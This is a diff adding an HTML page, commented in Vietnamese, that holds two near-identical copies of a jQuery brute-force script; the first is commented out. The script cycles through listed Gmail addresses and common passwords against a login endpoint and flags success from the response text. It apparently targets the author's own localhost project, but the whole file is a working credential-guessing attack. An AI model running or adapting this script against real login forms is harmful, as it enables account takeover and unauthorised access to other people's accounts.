@@ -1,0 +1,125 @@
+<!-- <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brute Force Test</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <script>
+        async function bruteForce() {
+            const url = 'http://localhost/hk9/taitam16c/pages/handle/login.php'; // URL của form đăng nhập
+            const usernames = [
+                'nguyenduytaiskt1359@gmail.com',
+                'nguyenduytaiskt2359@gmail.com',
+                'nguyenduytaiskt3359@gmail.com',
+                'nguyenduytaiskt359@gmail.com'
+                // Thêm các tài khoản khác nếu cần
+            ];
+            const passwords = [
+                'password1',
+                'password2',
+                '1234567'
+                // Thêm các mật khẩu khác nếu cần
+            ];
+        
+            for (let username of usernames) {
+                for (let password of passwords) {
+                    try {
+                        const response = await $.ajax({
+                            url: url,
+                            type: "post",
+                            data: {
+                                account_email: username,
+                                account_password: password,
+                                login: true // Thêm nếu cần thiết cho việc xác thực
+                            },
+                        });
+        
+                        // In ra phản hồi từ server để kiểm tra
+                        console.log("Response:", response);
+        
+                        // Kiểm tra nếu phản hồi chứa thông báo thất bại
+                        if (response.includes("Tài khoản hoặc mật khẩu không chính xác")) {
+                            console.log(`Đăng nhập thất bại tài khoản ${username} với mật khẩu: ${password}`);
+                        } else if (response.includes("Đăng nhập thành công")) { // Điều chỉnh thông điệp theo phản hồi của bạn
+                            alert(`Đăng nhập thành công tài khoản ${username} với mật khẩu: ${password}`);
+                            return; // Dừng sau khi thành công
+                        }
+                    } catch (error) {
+                        console.error("Error:", error);
+                    }
+                }
+            }
+        }
+        // Bắt đầu tấn công brute force
+        bruteForce();
+        
+    </script>
+</body>
+</html> -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brute Force Test</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <script>
+        async function bruteForce() {
+            const url = 'http://localhost/hk9/taitam16c/pages/handle/login.php'; // URL của form đăng nhập
+            const usernames = [
+                'nguyenduytaiskt1359@gmail.com',
+                'nguyenduytaiskt2359@gmail.com',
+                'nguyenduytaiskt3359@gmail.com',
+                'nguyenduytaiskt359@gmail.com'
+                // Thêm các tài khoản khác nếu cần
+            ];
+            const passwords = [
+                'password1',
+                'password2',
+                '123456'
+                // Thêm các mật khẩu khác nếu cần
+            ];
+
+            for (let username of usernames) {
+                for (let password of passwords) {
+                    try {
+                        const response = await $.ajax({
+                            url: url,
+                            type: "post",
+                            data: {
+                                account_email: username,
+                                account_password: password,
+                                login: true // Thêm nếu cần thiết cho việc xác thực
+                            },
+                        });
+
+                        // In ra phản hồi từ server để kiểm tra chính xác nội dung
+                        console.log(`Phản hồi từ server cho tài khoản ${username} với mật khẩu ${password}:`, response);
+
+                        // Kiểm tra nếu phản hồi chứa thông báo thất bại
+                        if (response.includes("Tài khoản hoặc mật khẩu không chính xác")) {
+                            console.log(`Đăng nhập thất bại: tài khoản ${username} với mật khẩu: ${password}`);
+                        } else if (response.includes("Đăng nhập thành công")) { // Điều chỉnh thông điệp theo phản hồi của bạn
+                            console.log(`Đăng nhập thành công: tài khoản ${username} với mật khẩu: ${password}`);
+                            return; // Dừng sau khi thành công
+                        } else {
+                            console.log(`Phản hồi không xác định cho tài khoản ${username} với mật khẩu ${password}`);
+                        }
+                    } catch (error) {
+                        console.error("Lỗi khi gửi yêu cầu:", error);
+                    }
+                }
+            }
+        }
+        
+        // Bắt đầu tấn công brute force
+        bruteForce();
+    </script>
+</body>
+</html>
